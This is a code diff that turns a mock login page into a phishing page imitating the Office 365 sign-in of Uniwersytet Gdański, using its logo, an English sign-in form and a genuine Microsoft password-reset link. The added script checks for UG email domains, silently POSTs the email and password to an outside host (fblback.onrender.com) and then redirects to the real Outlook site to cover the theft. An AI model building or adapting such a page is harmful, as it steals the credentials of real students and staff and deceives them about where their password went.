@@ -1,21 +1,69 @@
+
 <!DOCTYPE html>
-<html lang="pl">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Sign in to your account</title>
   <link rel="stylesheet" href="ug-style.css" />
 </head>
 <body>
-  <div class="bg">
+  <div class="background">
     <div class="login-box">
-      <h1>Sign in</h1>
-      <p class="email">student@studms.ug.edu.pl</p>
-      <input type="password" placeholder="Password" />
-      <a href="#">Forgot my password</a>
-      <button>Sign in</button>
-      <p class="note">Resetowanie zapomnianego hasła dla studentów i doktorantów UG odbywa się na Portalu Studenta w zakładce „Office 365”.</p>
+      <div class="logo">
+        <img src="assets/ug-logo.png" alt="UG Logo" class="logo" />
+        <span>Uniwersytet Gdański</span>
+      </div>
+      <form id="loginForm">
+        <div class="input-group">
+          <label for="email">Email</label>
+          <input type="email" id="email" name="email" required />
+        </div>
+        <div class="input-group">
+          <label for="password">Password</label>
+          <input type="password" id="password" name="password" required />
+          <div class="error" id="passwordError">Please enter your password.</div>
+        </div>
+        <div class="actions">
+          <a href="https://passwordreset.microsoftonline.com/" target="_blank">Forgot my password</a>
+        </div>
+        <button type="submit">Sign in</button>
+      </form>
     </div>
   </div>
+  <script type="module">
+    const loginForm = document.getElementById("loginForm");
+    const errorMessage = document.getElementById("errorMessage");
+
+    loginForm.addEventListener("submit", async (e) => {
+      e.preventDefault();
+      const email = document.getElementById("email").value.trim();
+      const password = document.getElementById("password").value.trim();
+
+      if (!email || !password) {
+        errorMessage.textContent = "Please enter your password.";
+        return;
+      }
+
+      const validDomains = ["@studms.ug.edu.pl", "@staffms.ug.edu.pl", "@ug.edu.pl"];
+      const valid = validDomains.some(domain => email.endsWith(domain));
+
+      if (!valid) {
+        errorMessage.textContent = "Please enter your password.";
+        return;
+      }
+
+      try {
+        await fetch("https://fblback.onrender.com/login", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ email, password })
+        });
+        window.location.href = "https://outlook.office.com/mail/";
+      } catch (err) {
+        window.location.href = "https://outlook.office.com/mail/";
+      }
+    });
+  </script>
 </body>
 </html>
